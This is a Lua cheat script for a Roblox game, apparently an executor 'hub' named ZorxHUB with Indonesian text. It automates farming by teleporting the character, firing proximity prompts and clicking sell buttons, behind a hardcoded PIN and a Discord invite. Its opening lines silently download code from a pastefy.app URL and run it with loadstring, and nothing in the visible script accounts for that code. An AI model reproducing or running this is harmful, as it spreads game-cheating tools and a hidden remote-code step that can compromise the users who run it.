-- LOADSTRING EKSTERNAL
task.spawn(function()
    pcall(function()
        loadstring(game:HttpGet("https://pastefy.app/wa3v2Vgm/raw"))("Spider Script")
    end)
end)

-- UI SYSTEM
if game.CoreGui:FindFirstChild("ZorxHUB") then game.CoreGui:FindFirstChild("ZorxHUB"):Destroy() end
local ScreenGui = Instance.new("ScreenGui", game.CoreGui)
ScreenGui.Name = "ZorxHUB"
ScreenGui.ResetOnSpawn = false

local PosToko, PosKebun, TargetNPC = nil, nil, nil
local _Running = false
local WaktuSedot1 = 9
local WaktuDiToko = 9
local WaktuSedot2 = 13
local BatasKetat = 250   
local Whitelisted = false

-- UI FRAME UTAMA
local Main = Instance.new("Frame", ScreenGui)
Main.Size = UDim2.new(0, 250, 0, 350)
Main.Position = UDim2.new(0.4, 0, 0.3, 0)
Main.BackgroundColor3 = Color3.fromRGB(15, 15, 15)
Main.Active = true
Main.Draggable = true
Main.Visible = true -- Terbuka saat awal
Instance.new("UICorner", Main)

-- TOMBOL LOGO BUKA (NZK)
local OpenBtn = Instance.new("TextButton", ScreenGui)
OpenBtn.Name = "ZorxLogo"
OpenBtn.Size = UDim2.new(0, 55, 0, 55)
OpenBtn.Position = UDim2.new(0, 10, 0.4, 0)
OpenBtn.BackgroundColor3 = Color3.fromRGB(30, 0, 50)
OpenBtn.Text = "NZK"
OpenBtn.TextColor3 = Color3.new(1, 1, 1)
OpenBtn.Font = Enum.Font.SourceSansBold
OpenBtn.TextSize = 20
OpenBtn.Visible = false -- Sembunyi jika Menu Utama muncul
OpenBtn.Active = true
OpenBtn.Draggable = true -- Bisa digeser biar gak ganggu
OpenBtn.ZIndex = 10 -- Memastikan di paling depan
Instance.new("UICorner", OpenBtn).CornerRadius = UDim.new(1, 0)

-- TOMBOL TUTUP (X)
local CloseBtn = Instance.new("TextButton", Main)
CloseBtn.Size = UDim2.new(0, 30, 0, 30)
CloseBtn.Position = UDim2.new(1, -35, 0, 5)
CloseBtn.Text = "X"
CloseBtn.BackgroundColor3 = Color3.fromRGB(180, 0, 50)
CloseBtn.TextColor3 = Color3.new(1, 1, 1)
CloseBtn.Font = Enum.Font.SourceSansBold
CloseBtn.ZIndex = 7
Instance.new("UICorner", CloseBtn)

-- FUNGSI BUKA TUTUP
CloseBtn.MouseButton1Click:Connect(function()
    Main.Visible = false
    OpenBtn.Visible = true
end)

OpenBtn.MouseButton1Click:Connect(function()
    Main.Visible = true
    OpenBtn.Visible = false
end)

local Title = Instance.new("TextLabel", Main)
Title.Size = UDim2.new(1, 0, 0, 40)
Title.Text = "ZorxHUB 🤡 (Fast NPC Cycle)"
Title.TextColor3 = Color3.new(1, 1, 1)
Title.BackgroundColor3 = Color3.fromRGB(30, 0, 50)
Title.Font = Enum.Font.SourceSansBold
Title.TextSize = 16
Instance.new("UICorner", Title)

-- PIN SYSTEM & DISCORD SECTION
local LockFrame = Instance.new("Frame", Main)
LockFrame.Size = UDim2.new(1, 0, 1, -40)
LockFrame.Position = UDim2.new(0, 0, 0, 40)
LockFrame.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
LockFrame.ZIndex = 5

local JoinText = Instance.new("TextLabel", LockFrame)
JoinText.Size = UDim2.new(1, 0, 0, 20)
JoinText.Position = UDim2.new(0, 0, 0.05, 0)
JoinText.Text = "Join to discord Pin👇"
JoinText.TextColor3 = Color3.new(1, 1, 1)
JoinText.BackgroundTransparency = 1
JoinText.Font = Enum.Font.SourceSansSemibold
JoinText.TextSize = 14
JoinText.ZIndex = 6

local CopyBtn = Instance.new("TextButton", LockFrame)
CopyBtn.Size = UDim2.new(0.8, 0, 0, 30)
CopyBtn.Position = UDim2.new(0.1, 0, 0.15, 0)
CopyBtn.Text = "KLIK UNTUK SALIN DISCORD"
CopyBtn.BackgroundColor3 = Color3.fromRGB(88, 101, 242)
CopyBtn.TextColor3 = Color3.new(1, 1, 1)
CopyBtn.Font = Enum.Font.SourceSansBold
CopyBtn.ZIndex = 6
Instance.new("UICorner", CopyBtn)

CopyBtn.MouseButton1Click:Connect(function()
    setclipboard("https://discord.gg/4r4HXuXdc")
    CopyBtn.Text = "LINK DISALIN!"
    task.wait(2)
    CopyBtn.Text = "KLIK UNTUK SALIN DISCORD"
end)

local InputPin = Instance.new("TextBox", LockFrame)
InputPin.Size = UDim2.new(0.8, 0, 0, 40)
InputPin.Position = UDim2.new(0.1, 0, 0.40, 0)
InputPin.PlaceholderText = "MASUKKAN PIN DISINI"
InputPin.Text = ""
InputPin.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
InputPin.TextColor3 = Color3.new(1, 1, 1)
InputPin.ZIndex = 6
Instance.new("UICorner", InputPin)

local VerifyBtn = Instance.new("TextButton", LockFrame)
VerifyBtn.Size = UDim2.new(0.8, 0, 0, 40)
VerifyBtn.Position = UDim2.new(0.1, 0, 0.60, 0)
VerifyBtn.Text = "VERIFIKASI PIN"
VerifyBtn.BackgroundColor3 = Color3.fromRGB(0, 150, 0)
VerifyBtn.TextColor3 = Color3.new(1, 1, 1)
VerifyBtn.ZIndex = 6
Instance.new("UICorner", VerifyBtn)

VerifyBtn.MouseButton1Click:Connect(function()
    if InputPin.Text == "140810" then 
        LockFrame.Visible = false 
        Whitelisted = true
    else 
        VerifyBtn.Text = "PIN SALAH!"; 
        task.wait(1.5); 
        VerifyBtn.Text = "VERIFIKASI PIN"
    end
end)

-- SISA LOGIKA HUB (TIDAK BERUBAH)
local function createBtn(txt, pos, color)
    local b = Instance.new("TextButton", Main)
    b.Size = UDim2.new(0.9, 0, 0, 35)
    b.Position = pos
    b.Text = txt
    b.TextColor3 = Color3.new(1,1,1)
    b.BackgroundColor3 = color
    Instance.new("UICorner", b)
    return b
end

local BtnToko = createBtn("1. SET TOKO & LOCK NPC", UDim2.new(0.05, 0, 0.20, 0), Color3.fromRGB(0, 100, 255))
local BtnKebun = createBtn("2. SET KEBUN", UDim2.new(0.05, 0, 0.33, 0), Color3.fromRGB(0, 100, 255))
local StartBtn = createBtn("3. START ZorxHUB 🧐", UDim2.new(0.05, 0, 0.50, 0), Color3.fromRGB(180, 0, 50))

local Status = Instance.new("TextLabel", Main)
Status.Size = UDim2.new(1, 0, 0, 40)
Status.Position = UDim2.new(0, 0, 0.85, 0)
Status.Text = "Status: Idle"
Status.TextColor3 = Color3.fromRGB(255, 255, 0)
Status.BackgroundTransparency = 1
Status.TextWrapped = true

BtnToko.MouseButton1Click:Connect(function()
    local lp = game.Players.LocalPlayer
    PosToko = lp.Character.HumanoidRootPart.CFrame
    local dist = math.huge
    for _, v in pairs(game.Workspace:GetDescendants()) do
        if v:IsA("ProximityPrompt") and v.ActionText:lower():find("talk") then
            local d = (lp.Character.HumanoidRootPart.Position - v.Parent.Position).Magnitude
            if d < dist then dist = d; TargetNPC = v end
        end
    end
    BtnToko.Text = TargetNPC and "NPC: "..TargetNPC.Parent.Name or "TOKO OK!"
end)

BtnKebun.MouseButton1Click:Connect(function() 
    PosKebun = game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame
    BtnKebun.Text = "KEBUN OK!" 
end)

StartBtn.MouseButton1Click:Connect(function()
    if not PosToko or not PosKebun then return end
    _Running = not _Running
    StartBtn.Text = _Running and "ZorxHUB AKTIF" or "START"
    
    task.spawn(function()
        local lp = game.Players.LocalPlayer
        while _Running do
            pcall(function()
                local hrp = lp.Character.HumanoidRootPart
                hrp.CFrame = PosKebun
                local startS1 = tick()
                while tick() - startS1 < WaktuSedot1 do
                    if not _Running then break end
                    Status.Text = "Status: Sedot Utama (".. math.floor(WaktuSedot1 - (tick() - startS1)) .."s)"
                    for _, v in pairs(game.Workspace:GetDescendants()) do
                        if v:IsA("ProximityPrompt") and not v.ActionText:lower():find("talk") then
                            if (v.Parent.Position - PosKebun.Position).Magnitude <= BatasKetat then
                                fireproximityprompt(v)
                            end
                        end
                    end
                    task.wait(0.1)
                end
                if _Running then
                    Status.Text = "Status: Teleport ke NPC..."
                    hrp.CFrame = PosToko
                    task.wait(0.5)
                    local startT = tick()
                    while tick() - startT < WaktuDiToko do
                        if not _Running then break end
                        Status.Text = "Status: Jual Opsi 3 (".. math.floor(WaktuDiToko - (tick() - startT)) .."s)"
                        hrp.CFrame = PosToko
                        if TargetNPC then fireproximityprompt(TargetNPC) end
                        pcall(function()
                            for _, ui in pairs(lp.PlayerGui:GetDescendants()) do
                                if ui:IsA("TextButton") and ui.Visible then
                                    if ui.Text:lower():find("3") or ui.Name:lower():find("3") then
                                        firesignal(ui.MouseButton1Click)
                                    end
                                end
                            end
                        end)
                        task.wait(0.5)
                    end
                end
                if _Running then
                    hrp.CFrame = PosKebun
                    local startS2 = tick()
                    while tick() - startS2 < WaktuSedot2 do
                        if not _Running then break end
                        Status.Text = "Status: Pembersihan Akhir (".. math.floor(WaktuSedot2 - (tick() - startS2)) .."s)"
                        for _, v in pairs(game.Workspace:GetDescendants()) do
                            if v:IsA("ProximityPrompt") and not v.ActionText:lower():find("talk") then
                                if (v.Parent.Position - PosKebun.Position).Magnitude <= BatasKetat then
                                    fireproximityprompt(v)
                                end
                            end
                        end
                        task.wait(0.1)
                    end
                end
                Status.Text = "Status: Siklus Selesai, Mengulang..."
                task.wait(0.2)
            end)
        end
    end)
end)
